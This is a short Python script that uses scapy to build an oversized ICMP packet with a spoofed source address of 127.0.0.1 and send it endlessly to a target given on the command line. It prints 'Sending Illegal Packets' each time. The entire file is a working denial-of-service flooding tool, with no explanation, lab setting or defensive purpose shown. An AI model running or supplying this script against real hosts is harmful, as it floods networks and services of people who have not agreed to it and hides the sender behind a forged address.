import sys
import scapy.all as scapy
from scapy.layers.inet import IP,TCP,ICMP

dest = sys.argv[1]
i = 0
message="NS"
message = message * 5000
packet = IP(dst=dest,src="127.0.0.1")/ICMP()/(message)
while (1):
    i = i + 1
    print("Sending Illegal Packets #",i)
    scapy.send(packet)

        
        


